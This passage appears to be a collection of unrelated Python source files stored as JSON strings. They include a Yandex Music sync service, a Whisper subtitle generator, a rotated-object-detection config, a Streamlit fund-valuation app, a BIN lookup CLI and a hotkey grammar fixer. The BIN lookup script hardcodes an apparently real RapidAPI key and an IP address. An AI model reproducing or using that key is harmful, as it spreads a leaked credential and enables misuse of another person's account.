f\"{BASE_URL}stations/{api_transport_type_name}\"\n    json_response = requests.get(url)\n    if json_response.ok:\n        stations = StationShort.schema().loads(json_response.content, many=True)\n        return stations\n    else:\n        return None\n\ndef get_all_transports() -> List[Transport]:\n    url = f\"{BASE_URL}transports/all\"\n    json_response = requests.get(url)\n    if json_response.ok:\n        stations = Transport.schema().loads(json_response.content, many=True)\n        return stations\n    else:\n        return None\n\ndef get_transport_by_name(name: str) -> Transport:\n    url = f\"{BASE_URL}transports/get\"\n    params = {\"name\": name}\n    json_response = requests.get(url, params=params)\n    if json_response.ok:\n        return Transport.from_json(json_response.content)\n    else:\n        return None\n",
    "from yandex_music import Client\nfrom constants import YA_TOKEN\nfrom utilities import TrackManager, LoggerSetup\nfrom typing import List, Dict\nimport json\n\n\nclass YandexService:\n    def __init__(self):\n        self.client = Client(YA_TOKEN).init()\n        self.logger = LoggerSetup.setup_logger()\n\n    def fetch_and_refresh_tracks(self):\n        self.logger.info(\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0442\u0440\u0435\u043a\u043e\u0432 \u0438\u0437 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438...\")\n        filename = 'yandex_tracks.json'\n        track_manager = TrackManager(filename)\n        liked_tracks = self.client.users_likes_tracks().fetchTracks()\n        track_manager.refresh_tracks(liked_tracks, 'yandex')\n        self.logger.info(\"\u0422\u0440\u0435\u043a\u0438 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u044b.\")\n\n    def add_to_yandex(self, tracks: List[Dict]):\n        for track in tracks:\n            try:\n                search_result = self.client.search(f\"{track['artist']} {track['track_name']}\")\n                if search_result.tracks is None:\n                    self.logger.warning(\n                        f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n                    continue\n                track_id = search_result.tracks['results'][0]['id']\n                self.logger.info(\n                    f\"\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0440\u0435\u043a\u0430 {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u0432 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0443...\")\n                self.client.users_likes_tracks_add([track_id])\n            except IndexError:\n                self.logger.warning(\n                    f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n            except TypeError:\n                self.logger.warning(\n                    f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n\n    def delete_from_yandex(self, tracks: List[Dict]):\n        deleted_tracks = []\n        for track in tracks:\n            try:\n                try:\n                    search_result = self.client.search(f\"{track['artist']} {track['track_name']}\")\n                except Exception as e:\n                    self.logger.warning(\n                        f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n                    continue\n                if search_result.tracks is None:\n                    self.logger.warning(\n                        f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n                    continue\n                track_id = search_result.tracks['results'][0]['id']\n                self.logger.info(\n                    f\"\u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0442\u0440\u0435\u043a\u0430 {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u0438\u0437 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438...\")\n                self.client.users_likes_tracks_remove([track_id])\n                deleted_tracks.append({'id': track_id, 'artist': track['artist'], 'track_name': track['track_name']})\n            except IndexError:\n                self.logger.warning(\n                    f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n        with open('deleted_yandex_tracks.json', 'w', encoding='utf-8') as file:\n            self.logger.info(f\"\u0423\u0434\u0430\u043b\u0435\u043d\u043e {len(deleted_tracks)} \u0438\u0437 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438...\")\n            json.dump(deleted_tracks, file, ensure_ascii=False, indent=4)\n",
    "import random\n\ndef gen_test_func(test_func1, test_func2):\n    def single_test(*args):\n        return test_func1(*args) == test_func2(*args)\n    return single_test\n\n\ndef random_str(alphabet: list[str]) -> str:\n    return random_str_len(alphabet, 1, 10)\n\n\ndef random_str_len(alphabet: list[str], min_len: int, max_len: int) -> str:\n    return \"\".join([random.choice(alphabet) for _ in range(random.randint(min_len, max_len))])\n\n\ndef random_str_fixed_len(alphabet: list[str], length: int) -> str:\n    return \"\".join([random.choice(alphabet) for _ in range(length)])\n\n\ndef random_test(test_func, alphabet: list[str], num_tests: int, test_func2 = None, input_gen = random_str):\n    for _ in range(num_tests):\n        test_input = input_gen(alphabet)\n        if test_func2 is not None:\n            result = (test_func(test_input) == test_func2(test_input))\n            if not result:\n                print(test_input)\n                print(test_func(test_input))\n                print(test_func2(test_input))\n                assert False\n        else:\n            res = test_func(test_input)\n            if(not res):\n                print(\"failed\", test_input)\n                return\n",
    "import json\nimport re\n\nfrom faster_whisper import WhisperModel\nfrom timeit import default_timer as timer\nfrom loguru import logger\n\nfrom app.config import config\nfrom app.utils import utils\n\nmodel_size = config.whisper.get(\"model_size\", \"large-v3\")\ndevice = config.whisper.get(\"device\", \"cpu\")\ncompute_type = config.whisper.get(\"compute_type\", \"int8\")\nmodel = None\n\n\ndef create(audio_file, subtitle_file: str = \"\"):\n    global model\n    if not model:\n        logger.info(f\"loading model: {model_size}, device: {device}, compute_type: {compute_type}\")\n        model = WhisperModel(model_size_or_path=model_size,\n                             device=device,\n                             compute_type=compute_type)\n\n    logger.info(f\"start, output file: {subtitle_file}\")\n    if not subtitle_file:\n        subtitle_file = f\"{audio_file}.srt\"\n\n    segments, info = model.transcribe(\n        audio_file,\n        beam_size=5,\n        word_timestamps=True,\n        vad_filter=True,\n        vad_parameters=dict(min_silence_duration_ms=500),\n    )\n\n    logger.info(f\"detected language: '{info.language}', probability: {info.language_probability:.2f}\")\n\n    start = timer()\n    subtitles = []\n\n    def recognized(seg_text, seg_start, seg_end):\n        seg_text = seg_text.strip()\n        if not seg_text:\n            return\n\n        msg = \"[%.2fs -> %.2fs] %s\" % (seg_start, seg_end, seg_text)\n        logger.debug(msg)\n\n        subtitles.append({\n            \"msg\": seg_text,\n            \"start_time\": seg_start,\n            \"end_time\": seg_end\n        })\n\n    for segment in segments:\n        words_idx = 0\n        words_len = len(segment.words)\n\n        seg_start = 0\n        seg_end = 0\n        seg_text = \"\"\n\n        if segment.words:\n            is_segmented = False\n            for word in segment.words:\n                if not is_segmented:\n                    seg_start = word.start\n                    is_segmented = True\n\n                seg_end = word.end\n                # \u5982\u679c\u5305\u542b\u6807\u70b9,\u5219\u65ad\u53e5\n                seg_text += word.word\n\n                if utils.str_contains_punctuation(word.word):\n                    # remove last char\n                    seg_text = seg_text[:-1]\n                    if not seg_text:\n                        continue\n\n                    recognized(seg_text, seg_start, seg_end)\n\n                    is_segmented = False\n                    seg_text = \"\"\n\n                if words_idx == 0 and segment.start < word.start:\n                    seg_start = word.start\n                if words_idx == (words_len - 1) and segment.end > word.end:\n                    seg_end = word.end\n                words_idx += 1\n\n        if not seg_text:\n            continue\n\n        recognized(seg_text, seg_start, seg_end)\n\n    end = timer()\n\n    diff = end - start\n    logger.info(f\"complete, elapsed: {diff:.2f} s\")\n\n    idx = 1\n    lines = []\n    for subtitle in subtitles:\n        text = subtitle.get(\"msg\")\n        if text:\n            lines.append(utils.text_to_srt(idx, text, subtitle.get(\"start_time\"), subtitle.get(\"end_time\")))\n            idx += 1\n\n    sub = \"\\n\".join(lines) + \"\\n\"\n    with open(subtitle_file, \"w\", encoding=\"utf-8\") as f:\n        f.write(sub)\n    logger.info(f\"subtitle file created: {subtitle_file}\")\n\n\ndef file_to_subtitles(filename):\n    times_texts = []\n    current_times = None\n    current_text = \"\"\n    index = 0\n    with open(filename, 'r', encoding=\"utf-8\") as f:\n        for line in f:\n            times = re.findall(\"([0-9]*:[0-9]*:[0-9]*,[0-9]*)\", line)\n            if times:\n                current_times = line\n            elif line.strip() == '' and current_times:\n                index += 1\n                times_texts.append((index, current_times.strip(), current_text.strip()))\n                current_times, current_text = None, \"\"\n            elif current_times:\n                current_text += line\n    return times_texts\n\n\ndef correct(subtitle_file, video_script):\n    subtitle_items = file_to_subtitles(subtitle_file)\n    script_lines = utils.split_string_by_punctuations(video_script)\n\n    corrected = False\n    if len(subtitle_items) == len(script_lines):\n        for i in range(len(script_lines)):\n            script_line = script_lines[i].strip()\n            subtitle_line = subtitle_items[i][2]\n            if script_line != subtitle_line:\n                logger.warning(f\"line {i + 1}, script: {script_line}, subtitle: {subtitle_line}\")\n                subtitle_items[i] = (subtitle_items[i][0], subtitle_items[i][1], script_line)\n                corrected = True\n\n    if corrected:\n        with open(subtitle_file, \"w\", encoding=\"utf-8\") as fd:\n            for item in subtitle_items:\n                fd.write(f\"{item[0]}\\n{item[1]}\\n{item[2]}\\n\\n\")\n        logger.info(f\"subtitle corrected\")\n    else:\n        logger.success(f\"subtitle is correct\")\n\n\nif __name__ == \"__main__\":\n    task_id = \"c12fd1e6-4b0a-4d65-a075-c87abe35a072\"\n    task_dir = utils.task_dir(task_id)\n    subtitle_file = f\"{task_dir}/subtitle.srt\"\n    audio_file",
    "_base_ = [\n    '../../_base_/datasets/dotav1.py', '../../_base_/schedules/schedule_1x.py',\n    '../../_base_/default_runtime.py'\n]\nangle_version = 'le90'\n# runner\nrunner = dict(type=\"EpochBasedKDRunner\", max_epochs=12)\n# teacher cfg\ndistiller_cfg = dict(\n    teacher_cfg=\"configs/distillation/rotated_retinanet_obb_r50_fpn_1x_dota_le90.py\",\n    teacher_pretrained=\"teacher_checkpoints/rotated_retinanet_obb_r50.pth\",\n)\nprunning_ratio = 0.8\n\nmodel = dict(\n    type='FGDRotatedRetinaNet',\n    distillation=dict(\n        temp=0.5,\n        alpha=0.001,\n        beta=0.0005,  # 0.0005\n        gamma=0.0005,  # 0.0005\n        eta=0.000005,  # 0.000005\n        feat_dim=256,      \n    ),\n    backbone=dict(\n        type='ResNet',\n        depth=50,\n        num_stages=4,\n        out_indices=(0, 1, 2, 3),\n        base_channels = int(64 * prunning_ratio),\n        frozen_stages=1,\n        zero_init_residual=False,\n        norm_cfg=dict(type='BN', requires_grad=True),\n        norm_eval=True,\n        style='pytorch',\n        init_cfg=dict(type='Pretrained', checkpoint='prune_ckpt/resnet50_trimmed.pth')),\n    neck=dict(\n        type='FPN',\n        in_channels=[int(64*prunning_ratio)*1*4, int(64*prunning_ratio)*2*4, int(64*prunning_ratio)*4*4, int(64*prunning_ratio)*8*4],\n        out_channels=256,\n        start_level=1,\n        add_extra_convs='on_input',\n        num_outs=5),\n    bbox_head=dict(\n        type='RotatedRetinaHead',\n        num_classes=15,\n        in_channels=256,\n        stacked_convs=4,\n        feat_channels=256,\n        assign_by_circumhbbox=None,\n        anchor_generator=dict(\n            type='RotatedAnchorGenerator',\n            octave_base_scale=4,\n            scales_per_octave=3,\n            ratios=[1.0, 0.5, 2.0],\n            strides=[8, 16, 32, 64, 128]),\n        bbox_coder=dict(\n            type='DeltaXYWHAOBBoxCoder',\n            angle_range=angle_version,\n            norm_factor=None,\n            edge_swap=True,\n            proj_xy=True,\n            target_means=(.0, .0, .0, .0, .0),\n            target_stds=(1.0, 1.0, 1.0, 1.0, 1.0)),\n        loss_cls=dict(\n            type='FocalLoss',\n            use_sigmoid=True,\n            gamma=2.0,\n            alpha=0.25,\n            loss_weight=1.0),\n        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),\n    train_cfg=dict(\n        assigner=dict(\n            type='MaxIoUAssigner',\n            pos_iou_thr=0.5,\n            neg_iou_thr=0.4,\n            min_pos_iou=0,\n            ignore_iof_thr=-1,\n            iou_calculator=dict(type='RBboxOverlaps2D')),\n        allowed_border=-1,\n        pos_weight=-1,\n        debug=False),\n    test_cfg=dict(\n        nms_pre=2000,\n        min_bbox_size=0,\n        score_thr=0.05,\n        nms=dict(iou_thr=0.1),\n        max_per_img=2000))\n\nimg_norm_cfg = dict(\n    mean=[123.675, 116.28, 103.53], std=[58.395, 57.12, 57.375], to_rgb=True)\ntrain_pipeline = [\n    dict(type='LoadImageFromFile'),\n    dict(type='LoadAnnotations', with_bbox=True),\n    dict(type='RResize', img_scale=(1024, 1024)),\n    dict(\n        type='RRandomFlip',\n        flip_ratio=[0.25, 0.25, 0.25],\n        direction=['horizontal', 'vertical', 'diagonal'],\n        version=angle_version),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='Pad', size_divisor=32),\n    dict(type='DefaultFormatBundle'),\n    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels'])\n]\ndata = dict(\n    samples_per_gpu=2,\n    workers_per_gpu=2,\n    train=dict(pipeline=train_pipeline, version=angle_version),\n    val=dict(version=angle_version),\n    test=dict(version=angle_version))\n",
    "from vmCall import makeVM, VM\n\ncode1 = \"\"\"\ndef outer_function():\n    x = 10\n    y = 10\n    a = 1\n    def inner_function():\n        print(x)\n    return inner_function()\nprint(outer_function())\n\"\"\"\n\ncode1 = \"\"\"\nprint({'name': 'Khanh', 'nickname': 'KhanhNguyen9872'}['nickname'])\n\nwhile 1:\n    if True:\n        print(\"Oh\")\n        break\n    else:\n        continue\n\nfor i in range(0, 9):\n    print(f\"i={str(i)},\", end = ' ', flush = True)\n\nvalue = 1\nvalue2 = 3\n\nif value == None:\n    exit(0)\nelif value == False:\n    exit(0)\nelse:\n    value = 2\n\nmatch value:\n    case 1:\n        print(1)\n    case 2:\n        print(\"value is 2\")\n    case 3:\n        print(3)\n\nmatch value2:\n    case 1:\n        print(1)\n    case 2:\n        print(2)\n    case 3:\n        value2 = True\n\nprint(value2)\nvalue = \"Khanh\"\n\nprint(f\"My name is {value}\")\n\"\"\"\n\n\ncode1 = \"\"\"\ndef solve_quadratic(a, b, c):\n    delta = b**2 - 4*a*c\n    \n    if delta > 0:\n        x1 = (-b + delta**0.5) / (2*a)\n        x2 = (-b - delta**0.5) / (2*a)\n        return x1, x2\n    elif delta == 0:\n        x = -b / (2*a)\n        return x\n    else:\n        return None\n\na = 1\nb = -3\nc = 2\nx1, x2 = solve_quadratic(a, b, c)\nprint(\"Nghi\u1ec7m c\u1ee7a ph\u01b0\u01a1ng tr\u00ecnh {}x^2 + {}x + {} l\u00e0: {} {}\".format(a, b, c, x1, x2))\n\"\"\"\n\ncode1 = r\"\"\"\na = 12345\ndef is_prime(n = 7, divisor = 2):\n    if n <= 1:\n        return False\n    elif n == 2:\n        return True\n    elif n % divisor == 0:\n        return False\n    elif divisor * divisor > n:\n        return True\n    else:\n        return is_prime(n, divisor + 1)\n\n# Ki\u1ec3m tra s\u1ed1 7 c\u00f3 ph\u1ea3i l\u00e0 s\u1ed1 nguy\u00ean t\u1ed1 hay kh\u00f4ng\nprint(is_prime())  # Output: True\n\n# Ki\u1ec3m tra s\u1ed1 10 c\u00f3 ph\u1ea3i l\u00e0 s\u1ed1 nguy\u00ean t\u1ed1 hay kh\u00f4ng\nprint(is_prime(10))  # Output: False\n\"\"\"\n\n# code1 = \"\"\"\n\n\n# \"\"\"\n\n# make pickle\ncodeObj1 = makeVM(code1)\n# codeObj2 = makeVM(code2)\n# print(codeObj1)\n# print(codeObj2)\n\n# codeObj1.dis()\n# print(__import__('pickle').loads(codeObj1.pickle))\n\n# create VM\n# obj = VM(b'\\x80\\x04\\x95W\\x00\\x00\\x00\\x00\\x00\\x00\\x00C*d\\x00Z\\x00e\\x01e\\x00d\\x01\\x17\\x00\\x83\\x01\\x01\\x00e\\x01\\x83\\x00\\x01\\x00e\\x01d\\x02g\\x01d\\x03g\\x01\\x17\\x00\\x83\\x01\\x01\\x00d\\x04S\\x00\\x94(\\x8c\\nhello worl\\x94\\x8c\\x01d\\x94K\\x02K\\x03Nt\\x94\\x8c\\x01v\\x94\\x8c\\x05print\\x94\\x86\\x94\\x87\\x94.')\nobj1 = VM(codeObj1.obj)\n# obj1.__dis__()\n# obj2 = VM(codeObj2.pickle)\n# print(obj)\n# print(obj1)\n# print(obj2)\n\n# execute VM\nobj1()\n# print(\"> obj return: \" + str(obj()))\n# print(\"> obj1 return: \" + str(obj1()))\n# print(\"> obj2 return: \" + str(obj2()))\n",
    "ipca_url = 'https://api.bcb.gov.br/dados/serie/bcdata.sgs.433/dados?formato=json'\r\n\r\nimport streamlit as st\r\nimport pandas as pd\r\nimport plotly\r\nimport plotly.express as px\r\nimport yfinance as yf\r\nimport matplotlib \r\nfrom matplotlib import style\r\nimport matplotlib.pyplot as plt\r\nimport plotly.graph_objects as go\r\nimport numpy as np\r\nimport numpy_financial as npf\r\n\r\nst.page_link(\"Dash_Finance.py\", label=\"In\u00edcio\", icon=\"\ud83c\udfe0\")\r\n\r\nst.title(':green[Valuation FIIs]')\r\n\r\nst.markdown('---')\r\n\r\nwith st.spinner('Carregando informa\u00e7\u00f5es...'):\r\n    def busca_titulos_tesouro_direto():\r\n        url = 'https://www.tesourotransparente.gov.br/ckan/dataset/df56aa42-484a-4a59-8184-7676580c81e3/resource/796d2059-14e9-44e3-80c9-2d9e30b405c1/download/PrecoTaxaTesouroDireto.csv'\r\n        df  = pd.read_csv(url, sep=';', decimal=',')\r\n        df['Data Vencimento'] = pd.to_datetime(df['Data Vencimento'], dayfirst=True)\r\n        df['Data Base']       = pd.to_datetime(df['Data Base'], dayfirst=True)\r\n        multi_indice = pd.MultiIndex.from_frame(df.iloc[:, :3])\r\n        df = df.set_index(multi_indice).iloc[: , 3:]  \r\n        return df\r\n\r\n    titulos = busca_titulos_tesouro_direto()\r\n    titulos.sort_index(inplace=True)\r\n\r\n    ipca2045 = titulos.loc[('Tesouro IPCA+', '2045-05-15')]\r\n\r\n    #Spread mais recente do IPCA 2045\r\n    ultimo_ipca2045 = ipca2045['Taxa Compra Manha'][-1]\r\n    #Taxa IPCA\r\n    ipca_df = pd.read_json(ipca_url)\r\n    ipca_index = ipca_df.set_index('data')\r\n    ipca = ipca_index.iloc[-12:]\r\n    ipca_ultimo = sum(ipca['valor'])\r\n\r\n    \r\n    #Nome do Fundo\r\n    nome_fundo = st.text_input('Qual \u00e9 o nome do fundo?')\r\n    tipo_fii = st.selectbox(\r\n        \"Selecione o tipo do fundo a ser avaliado\",\r\n        (\"FII's Tijolo sem Crescimento\", \"FII's Tijolo com Crescimento\", \"FII's Papel\"),\r\n        index=None,\r\n        placeholder=\"Tipo do Fundo Imobili\u00e1rio\",\r\n    )\r\n    \r\n    st.markdown('---')\r\n    if nome_fundo:\r\n        papel_maiusculo = nome_fundo.upper()\r\n        ativo = f'{papel_maiusculo}.SA'\r\n\r\n        div_estimativa = st.checkbox('Colocar manualmente o provento do fundo')\r\n        st.caption(f'O modo autom\u00e1tico utiliza o \u00faltimo provento pago pelo fundo, estimar manualmente pode fazer sentido se o \u00faltimo provento pago for um valor n\u00e3o recorrente. Cheque no gr\u00e1fico de proventos abaixo se o valor \u00e9 recorrente.')\r\n\r\n        \r\n        papel_fii = yf.Ticker(ativo)\r\n        dados = papel_fii.history(period = '5y', interval = '1d')\r\n        dados_filtrados = dados[dados['Dividends'] > 0]\r\n        dados_filtrados = dados_filtrados.iloc[-12:]\r\n        dados_filtrados = dados_filtrados['Dividends']\r\n        \r\n        fig = px.bar(x=dados_filtrados.index, y=dados_filtrados.values, template = 'plotly_dark', height = 400, width = 800, title = f'Evolu\u00e7\u00e3o de Proventos do {papel_maiusculo}')\r\n        st.plotly_chart(fig)\r\n\r\n        if nome_fundo:\r\n            if div_estimativa:\r\n                dividendos = st.number_input(\"Digite o valor do provento a ser utilizado como base:\")\r\n                provento_anual = dividendos*12\r\n\r\n            else:\r\n                dividendos = dados_filtrados.tail(1)\r\n                provento_anual = dividendos*12\r\n                \r\n            \r\n        #Pr\u00eamio de Risco\r\n        # O Pr\u00eamio de Risco \u00e9 considerado geralmente de 1.5% a 3.5% de acordo com o risco do fundo.\r\n        premio_risco = st.number_input(\"Qual \u00e9 o pr\u00eamio de risco do fundo imobili\u00e1rio?\", placeholder=\"pr\u00eamio de risco...\")\r\n        premio_risco_float = float(premio_risco)\r\n        st.write('O Pr\u00eamio de Risco geralmente \u00e9 considerado entre 1.5% a 3.5%, de acordo com o risco do fundo.')\r\n        \r\n        st.markdown('---')\r\n        \r\n        #Taxa de Desconto\r\n        taxa_de_desconto = (premio_risco_float + ultimo_ipca2045)/100\r\n        \r\n        \r\n        #Valor de Mercado\r\n        market_value = dados.loc[:, 'Close'].iloc[-1]\r\n        \r\n        \r\n        #Valor da Cota\r\n        if tipo_fii ==  \"FII's Papel\":\r\n            tx_desconto = (ultimo_ipca2045 + ipca_ultimo + premio_risco_float)\r\n            valor_cota = (provento_anual/tx_desconto)*100\r\n        \r\n        elif tipo_fii ==  \"FIIs Tijolo com Crescimento\":\r\n            g = 1.05\r\n            valor_cota = npf.npv(taxa_de_desconto, [dividendos*g, dividendos*(g**2), dividendos*(g**3), dividendos*(g**4), dividendos*(g**5), (dividendos*(g**5)/taxa_de_desconto)]).round(2)\r\n        \r\n        else:\r\n            valor_cota = provento_anual/taxa_de_desconto\r\n            var_dados = ((market_value/valor_cota) -1)*100\r\n        \r\n        var_dados = float(((market_value/valor_cota) -1)*100)\r\n    \r\n        valor_cota = float(valor_cota.iloc[-1])\r\n        \r\n        st.write(f'O valor estimado da cota do :blue[{papel_maiusculo}] \u00e9 :green[R${valor_cota:,.2f}]')\r\n        # crie deixar o resultado de var_dados aparecer em porcentagem\r\n        st.write(f'O valor de mercado do fundo :blue[{papel_maiusculo}] \u00e9 :green[R${market_value:,.2f}], ou seja, uma diferen\u00e7a de :violet[{(var_dados):.2f}%] em r",
    "import http.client\nimport json\nimport csv\nimport argparse\n\ndef get_bin_info(bin_number, verbose=False):\n    if verbose:\n        print(\"Fetching information for BIN number:\", bin_number)\n    conn = http.client.HTTPSConnection(\"neutrinoapi-bin-lookup.p.rapidapi.com\")\n\n    payload = f\"bin-number={bin_number}&customer-ip=60.234.81.148\"\n\n    headers = {\n        'content-type': \"application/x-www-form-urlencoded\",\n        'X-RapidAPI-Key': \"87f0b316e0msh4395b1db710fb7ep19b3ddjsnc06bdf0b304b\",\n        'X-RapidAPI-Host': \"neutrinoapi-bin-lookup.p.rapidapi.com\"\n    }\n\n    conn.request(\"POST\", \"/bin-lookup\", payload, headers)\n\n    res = conn.getresponse()\n    data = res.read()\n\n    return data.decode(\"utf-8\")\n\ndef format_bin_info(bin_info):\n    bin_info_dict = json.loads(bin_info)\n    return bin_info_dict\n\ndef main():\n    parser = argparse.ArgumentParser(description='LightBIN - A BIN lookup tool')\n    parser.add_argument('-b', '--bin', type=str, required=True, help='Single BIN number to get information')\n    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')\n    parser.add_argument('-o', '--output', choices=['json', 'csv'], help='Output format (JSON or CSV)')\n    args = parser.parse_args()\n\n    bin_info = get_bin_info(args.bin, args.verbose)\n    formatted_info = format_bin_info(bin_info)\n\n    if args.output == 'json':\n        print(json.dumps(formatted_info, indent=4))\n        with open(f'{args.bin}.json', 'w') as json_file:\n            json.dump(formatted_info, json_file, indent=4)\n    elif args.output == 'csv':\n        with open(f'{args.bin}.csv', 'w', newline='') as csvfile:\n            writer = csv.writer(csvfile)\n            writer.writerow(['Attribute', 'Value'])\n            for key, value in formatted_info.items():\n                writer.writerow([key, value])\n        print(f\"Information saved in {args.bin}.csv\")\n    else:\n        print(f\"BIN Number: {args.bin}\")\n        for key, value in formatted_info.items():\n            print(f\"{key}: {value}\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import time\nfrom string import Template\nfrom pynput import keyboard\nfrom pynput.keyboard import Key, Controller\nimport pyperclip\nimport requests\n\ncontroller = Controller()\n\n\nPROMPT_TEMPLATE = Template(\n    \"\"\"\"\n    Your task is to take the text provided and rewrite it into a clear, grammatically correct version while preserving the original meaning as closely as possible. Correct any spelling mistakes, punctuation errors, verb tense issues, word choice problems, and other grammatical mistakes. Do not add any new information like \"Sure, here is the revised text:\" or \"The corrected version is:\" or anything like that. Just edit the text and make it as clear and correct as possible.\n    \n    $text\n    \"\"\"\n)\n\nMODEL = \"gemma:2b-instruct-q5_K_M\"\n\ndef fix_text(text):\n    prompt = PROMPT_TEMPLATE.substitute(text=text)\n    response = requests.post(\n        \"http://localhost:11434/api/generate\",\n        json={\n            \"model\": MODEL,\n            \"prompt\": prompt,\n            \"keep_alive\": \"2m\",\n            \"stream\": False,\n        },\n    )\n    response.raise_for_status()\n    resp_json = response.json()\n    return resp_json.get(\"response\").strip()\n\n\ndef fix_selection():\n    with controller.pressed(Key.ctrl):\n        controller.tap(\"c\")\n\n    time.sleep(0.1)\n    text = pyperclip.paste()\n\n    if not text:\n        return\n    fixed_text = fix_text(text)\n    if not fixed_text:\n        return\n\n    pyperclip.copy(fixed_text)\n    time.sleep(0.1)\n\n    with controller.pressed(Key.ctrl):\n        controller.tap(\"v\")\n    print(\"Text fixed and pasted!\")\n\n\ndef on_press_f8(key):\n    if key == Key.f8:\n        fix_selection()\n\n\nwith keyboard.Listener(on_press=on_press_f8) as listener:\n    listener.join()\n",
    "import tkinter as tk\r\nfrom tkinter import filedialog,ttk,simpledialog,Scrollbar\r\nfrom ttkbootstrap import Style\r\nimport ttkbootstrap as tb \r\nimport pandas as pd \r\nimport json\r\nfrom PIL import Image, ImageTk\r\nimport numpy as np\r\nfrom PIL import Image, ImageDraw, ImageFont\r\nimport matplotlib.pyplot as plt\r\n\r\ndef create_centered_text_image(text, image_width, image_height, background_color='white', text_color='black'):\r\n    fig, ax = plt.subplots(figsize=(image_width / 100, image_height / 100))\r\n    ax.set_facecolor(background_color)\r\n    ax.text(0.5, 0.5, text, ha='center', va='center', fontsize=image_height/2, color=text_color)\r\n    ax.axis('off')\r\n    output_path = \"plots/centered_text_image.png\"\r\n    plt.savefig(output_path, bbox_inches='tight', pad_inches=0)\r\n    plt.close(fig)\r\n    return output_path\r\n\r\ndef merge_images_to_pdf(image_paths,title):\r\n    images = [Image.open(path) for path in image_paths]\r\n    num_images = len(images)\r\n    max_cols_per_row = int(np.ceil(np.sqrt(num_images)))\r\n    num_rows = (num_images + max_cols_per_row - 1) // max_cols_per_row\r\n    max_width = max(im.width for im in images)\r\n    max_height = max(im.height for im in images)\r\n    final_width = max_width * max_cols_per_row \r\n    final_height = max_height * num_rows + max_height//2\r\n    new_im = Image.new('RGB', (final_width, final_height), (255, 255, 255))\r\n    title_text =title\r\n    title_image = create_centered_text_image(title_text, max_width * max_cols_per_row, max_height // 2)\r\n    new_im.paste(Image.open(title_image),(0,0))\r\n    for i, im in enumerate(images):\r\n        row = i // max_cols_per_row\r\n        col = i % max_cols_per_row\r\n        x_offset = col * max_width\r\n        y_offset = row * max_height + max_height//2\r\n        new_im.paste(im, (x_offset, y_offset))\r\n    filepath = filedialog.asksaveasfilename(defaultextension=\".pdf\")\r\n    if filepath:\r\n        output_path = filepath\r\n    else:\r\n        output_path = f\"{title_text}.pdf\"\r\n    new_im.save(output_path, \"PDF\", resolution=100.0)\r\n\r\n\r\ndef convert_type(value, dtype):\r\n    if dtype == 'object':\r\n        return str(value)\r\n    elif 'float' in str(dtype):\r\n        return float(value)\r\n    elif 'int' in str(dtype):\r\n        return int(value)\r\n    else:\r\n        return value \r\n'''\r\nCreating a class for the tab DataFames:\r\nThis class will contain two button , the first one for importing files as dataFrames\r\nand the seconde button will leed to another window where the data Frame can be edited\r\n'''\r\n\r\nclass ScrollableFrame(tb.Frame):\r\n    def __init__(self, master, *args, **kwargs):\r\n        super().__init__(master, *args, **kwargs)\r\n\r\n        self.canvas = tb.Canvas(self)\r\n        self.scrollbar = tb.Scrollbar(self, orient=\"vertical\", command=self.canvas.yview)\r\n        self.scrollable_frame = tb.Frame(self.canvas)\r\n\r\n        self.scrollable_frame.bind(\"<Configure>\", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox(\"all\")))\r\n        self.canvas.create_window((0, 0), 